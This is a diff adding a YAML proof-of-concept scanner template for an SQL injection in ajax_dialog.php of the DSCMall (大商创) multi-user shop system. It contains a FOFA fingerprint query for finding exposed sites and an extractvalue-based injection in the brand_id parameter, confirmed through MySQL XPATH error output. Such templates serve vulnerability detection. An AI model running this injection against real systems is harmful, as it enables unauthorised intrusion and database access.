@@ -1,0 +1,17 @@
+id: poc-yaml-dscmall-ajax-dialog-php-sqli
+info:
+  name: 大商创多用户商城系统 ajax_dialog.php SQL注入漏洞
+  severity: high
+  tags:
+  - sql-injection
+  finger: 大商创多用户商城系统
+  fofa: body="dsc-choie"
+variables:
+  t1: random_int(100,1000)
+  t2: md5(t1)
+requests:
+- method: GET
+  path: /ajax_dialog.php?_=1600309513833&act=getUserInfo&brand_id=extractvalue(1,concat(0x7e,md5({{.t1}})))&is_jsonp=1&jsoncallback=jQuery19106489774159975068_1600309513832&seckillid=null&temp=backup_tpl_1
+  expression: status_code == 200 && contains(body,"MySQL server error report:Array")
+    && contains(body,"XPATH syntax error:") && contains(body,substr(t2,0,31))
+transport: http
